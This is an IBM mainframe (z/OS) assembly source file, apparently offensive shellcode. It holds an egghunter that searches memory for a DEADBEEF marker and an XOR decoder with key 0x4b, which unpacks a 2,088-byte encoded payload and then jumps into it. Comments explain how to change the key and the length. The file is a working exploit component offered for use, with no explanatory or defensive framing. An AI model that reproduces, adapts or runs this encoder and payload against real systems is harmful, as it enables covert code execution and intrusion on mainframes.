         TITLE 'sb_shellcode.s                                         x
               Author:  Bigendian Smalls' 
         ACONTROL AFPR                    
SBSHELL  CSECT                             
SBSHELL  AMODE 31                           
SBSHELL  RMODE ANY                           
         SYSSTATE ARCHLVL=2                   
         ENTRY MAIN
MAIN     DS    0F                              
** Begin setup and stack management **
         STM   6,4,12(13)     # store all the registers in old SP area
         LARL  15,*-4         # put base addr into R15 
         LR    12,15          # put given base addr into R12
         XR    1,1            # zeroout R1 for counting
         XR    2,2            # zeroout R1 for counting
         XR    3,3            # zeroout R3
         AFI   1,X'01010102'  # loading a 1 in R1 
         AFI   2,X'01010103'  # loading a 1 in R1 
         XR    1,2            # loading a 1 in R1
         LR    4,1            #  will put a 4 in R4
         SLA   4,1(1)         # make R1 == 4
         XR    10,10          # zeroout R10 for our egg
         XR    2,2            # zero 2
         LGFI  10,X'deadbeef' # load egghunter value into R10
         LR    11,12          # load  base int R11
LOOPER   AR    11,1           # add 1 to R11 
         L     3,1(2,11)      # retrieve value at R11 +1 indexR2=0
         CR    10,3           # compare egg with R11 mem pointer 
         BRC   7,LOOPER       # branch anything but equal
         AR    11,4           
         L     3,1(2,11)      # retrieve value at R11 +1 indexR2=0
         CR    10,3           # compare egg with R11 mem pointer 
         BRC   7,LOOPER       # 2nd check 2 in a row good to go!
         AR    11,1           # 1 for the offset from above
         SR    11,4           # 4 to skip last egg
         ST    13,4(,11)      # store old SP for later in wkg area
         ST    11,8(,13)      # store this in old wking area
         LR    13,11          # set up R13 pt to new wkg area
** End setup and stack management **
** Begin main decoding routine    **
         LR    3,11           # This is now our egghunter loc
         AR    3,4            # add 4 to 3
         AR    3,4            # R3 points to SC for decoding
         LR    5,3            # R5 points to SC for jumping to
         SR    3,1            # R3-1 to we can XI that addr w/o nulls
         SR    3,1            # R3-1 to we can XI that addr w/o nulls
         LR    4,1            # R4 has static 1
         XR    1,1            # R1 will be our byte counter
         XR    2,2            # R2 will be address pointer
LOOP1    AR    1,4            # add 1 to R1 byte counter
         ARK   2,3,1          # generate new address pointer
* put the XOR key  (enc buffer char) from below in the quotes below
         XI    1(2),X'4b'     # xor byte with key
* put the buffer len (num of bytes) in the next cmd in CHI 1,<here>
         CHI   1,2088         # to yield sc len
         BRC   4,LOOP1        # loop bwd 18 bytes if R1 < size
         XR    4,4
** Begin cleanup and stack management **
         L     13,4(4,11)     # reload old SP 
         LM    6,4,12(13)     # restore registers 
         BCR   15,5           # jmp to sc 
** End main decoding routine    **
         DC    X'DEADBEEF'     #egg
         DC    X'DEADBEEF'     #egg + old sp
*******************************************************************
*Number of bytes:    2088
*Padding bytes:         0
*Enc buffer char:  0x4b
*ASM buffer: 
         DC    X'dba79b478bbbb4b4b4b553448b0b4b4b48af1b9b0b4f539fecd34bX
               4aec834b4fecae48708f144b4b48bd8f244b4b48beecae48788f144bX
               4b48b98f244b4b48ba8fb64b4b489f8b5b4b4b4b5a533a1b3c4b4b51X
               371b3b3b4b5137ee31cb4b1b3b3b4becbf4b424b4b4b4b4b4b4b4b4bX
               4b4b4b4b4b4ea48f66b4b4b4b2a76c4b'
         DC    X'fa4b350a6b4b428f164b4b4880532eecae49fe8f164b4b48f4532eX
               ecae49e40a6b4b438f164b4b48f08b2a4b4b4b4becae49ee8f164b4bX
               48fa8b2a4b4b4b4aecae49d68f164b4b48e28b2a4b4b4b49ecae49deX
               0a6b4b428f164b4b48ea532eecae49c68f164b4b48d2532eecae49ccX
               8fb64b4b48348b5b4b4b4b138b3b4b4b'
         DC    X'4b0e8f344b4b4b1951378f344b4b4b1b8b3b4b4b4b0a8f344b4b4bX
               0751378f344b4b4b7551378f344b4b4b0d51378f344b4b4b7151378fX
               344b4b4b0b8b3b4b4b481a8f344b4b4b778f344b4b4b708f344b4b4bX
               718f344b4b4b728f344b4b4b738b3b4b4b4b7c8f344b4b4b7f51378fX
               344b4b4b795137ee31cb4b8f344b4b4b'
         DC    X'65ec4e4b664b4b4b4b4b4c2ac9c2de2ae9c34b4b4b4b4a4b4b4b49X
               4b4b4b4be9c34b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4bX
               4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4bX
               4b4b4b4b4b4b4b4b4ea4ec4e49a78bab4b4b4b400a6b4b428f164b4bX
               4853532eecbf494feca14b5b8f164b4b'
         DC    X'4845532eecbf4ab78fb64b4b49bd8b5b4b4b4b7e8b3b4b4b49a18fX
               344b4b4b648b3b4b4b49a98f344b4b4b608b3b4b4b49918f344b4b4bX
               6c8b3b4b4b499d8f344b4b4b688b3b4b4b4b538f344b4b4b548b3b4bX
               4b4b558f344b4b4b5051378f344b4b4b525137ee31cb4b8f344b4b4bX
               5eec4e4b5f4b4b4b4b4b4b4b4b4b4b4b'
         DC    X'4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4ea4X
               8fb64b4b49e48b5b4b4b4b618b3bb4b4b4ac8f344b4b4b6f8b3b4b4bX
               4b548f344b4b4b6b8b3b4b4b49f88f344b4b4b578b3b4b4b4b508f34X
               4b4b4b5351378f344b4b4b5d5137ee31cb4b8f344b4b4b59ec4e4b5aX
               4b4b4b4b4b5b4b4b4b4b4b4b4b4b4b4b'
         DC    X'4b4b4b4b4b4b4b4b4b4b4b4b4b4b4ea453b78f26b4b4b4b3a72c49X
               1a4b358fb64b4b493b8b5b4b4b4b6a8b3bb4b4b4ed8f344b4b4b508bX
               3b4b4b49138f344b4b4b5c8b3b4b4b4b5d8f344b4b4b5851378f344bX
               4b4b5a5137ee31cb4b8f344b4b4b46ec4e4b474b4b4b4b4b4b4b4b4bX
               4b4b4b4b4b4b4b4b4b4b4b4ea48fb64b'
         DC    X'4b49088b5b4b4b4b7d8b3bb4b4b43c8f344b4b4b7b8b3b4b4b4b62X
               8f344b4b4b678b3b4b4b4b508f344b4b4b638b3b4b4b4b548f344b4bX
               4b6f8b3b4b4b4b688f344b4b4b6b5137ee31cb4b8f344b4b4b57ec4eX
               4b504b4b4b4b4b4b4b4b4b4b5b494b4b4b4b4b4b4b4b4b4b4b4b4b4bX
               4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b'
         DC    X'4b4b4b4b4b4b4b4b4ea48bab4b4b4b470a6b4b4f8f16b4b4b4a7ecX
               234b4cecbf4bbaeca14b598f164b4b4ab2ec234b4decbf4ba38b1bb4X
               b4b4978b3b4b4b4b47ecae4b50ecae4a228b1b4b4b4aa5ecae4bc38bX
               1b4b4b4aa88b3bb4b4b4a5ecae4b47ecae4ace8babb4b4b4bd8b1bb4X
               b4b48becbf4b3d8fb64b4b4a82537c8f'
         DC    X'a44b4b4ae48b6b4b4b4b079c4c6b4b6b4b8b6b4b4b4b759c446b4bX
               6b4b8f144b4b4b098b5b4b4b4b748b3b4b4b4b798f344b4b4b608b3bX
               4b4b4b638f344b4b4b7e8b3b4b4b4ad98f344b4b4b7a8b3b4b4b4b55X
               8f344b4b4b668b3b4b4b4b698f344b4b4b628b3b4b4b4b638f344b4bX
               4b6e5137ee31cb4b8f344b4b4b6aec4e'
         DC    X'4b6b4b4b4b4b4b4b4b4b4b4b4b4a69696969696969696969696969X
               6969694b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4bX
               4b4b4b4b4b4b4b4ea48fa64b4b4a04533853b28f26b4b4b4a1a729abX
               4b4bb5a7233b4bb4b5ec4e4a7a8fb64b4b4a1c8fa44b4b4a778b5b4bX
               4b4b7a8b3bb4b4b4858f344b4b4b628b'
         DC    X'3b4b4b4b6d8f344b4b4b6c8f144b4b4b698b3b4b4b4a608f344b4bX
               4b6b8b3bb4b4b48a8f344b4b4b5751378f344b4b4b5151378f344b4bX
               4b535137ee31cb4b8f344b4b4b5fec4e4b584b4b4b4b4b4b4b4b4b4bX
               4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4ea48fa6X
               4b4b4bb28f26b4b4b4bd53bda7234ba9'
         DC    X'b4354cb58fb64b4b4a438fa44b4b4ba08b5b4b4b4b79533a503750X
               3750378f144b4b4b6e8f344b4b4b638f644b4b4b6a51378f344b4b4bX
               688f244b4b4b5751378f344b4b4b5551378f344b4b4b5751378f344bX
               4b4b515137ee31cb4b8f344b4b4b5dec4e4b5e4b4b4b4b4b4b4b4b4bX
               4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b'
         DC    X'4b4b4b4b4b4b4b4b4b4b4b4b4b4ea48fa64b4b4be28f36b4b4b4bdX
               a7334bd8b4354cb58fb64b4b4bf08fa44b4b4bd78b5b4b4b4b50533aX
               8f344b4b4b5c51378f344b4b4b5e51378f344b4b4b5851378f344b4bX
               4b5a5137ee31cb4b8f344b4b4b46ec4e4b474b4b4b4b4b4b4b4b4b4bX
               4b4b4b4b4b4b4b4b4b4b4ea48f26b4b4'
         DC    X'b4b2a7234b2bb4358f16b4b4b4a48f26b4b4b4a58fa64b4b4b2c4cX
               b58b5bb4b4b5b08f06b4b4b44b8b6b4b4b4bccecc34b5ea87b5b4b4bX
               3d8b704b4b4bb45273ec3f4b4dec234bceecbf4b45a81b6b4b4b3d8bX
               104b4b4bb451625122527eec3fb4bc5022092b5b4b51525002ec3fb4X
               a84cb58f06b4b4b5938b5bb4b4b586ec'
         DC    X'c34bce8b6b4b4b4b115062a87b5b4b4b3d8b704b4b4bb45273ec3fX
               4b4dec734b2eecbf4b425168a87b6b4b4b3d8b704b4b4bb4097b5b4bX
               51525002ec3fb4af4cb55cb48b0b4b4b4b5b1bbb0b4b139b0b4fd3a7X
               9b478b0b4b4b4b4c13bb0b4b4cb54b4b4b4b4b4b4b4b4b4b4b4b4b4bX
               4b4b4b4a4b4b4b494a1878f74a1878ef'
         DC    X'4a187c5b4a187d7d4a187d234a187d6f4a1878554a1878c14a1879X
               074a18784d4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b4b49497b724b4b4bX
               4b'
E2ABUF   DC    X'0102039c09867f978d8e0b0c0d0e0f101112139d0a08871819928fX
               1c1d1e1f808182838485171b88898a8b8c0506079091169394959604X
               98999a9b14FF9e1a20a0e2e4e0e1e3e5e7f1a22e3c282b7c26e9eaebX
               e8edeeefecdf21242a293b5e2d2fc2c4c0c1c3c5c7d1a62c255f3e3fX
               f8c9cacbc8cdcecfcc603a2340273d22'
         DC    X'd8616263646566676869abbbf0fdfeb1b06a6b6c6d6e6f707172aaX
               bae6b8c6a4b57e737475767778797aa1bfd05bdeaeaca3a5b7a9a7b6X
               bcbdbedda8af5db4d77b414243444546474849adf4f6f2f3f57d4a4bX
               4c4d4e4f505152b9fbfcf9faff5cf7535455565758595ab2d4d6d2d3X
               d530313233343536373839b3dbdcd9da'
         DC    X'9f'
******************************************************************
         DC    X'8BADF00D'   eof marker
         END
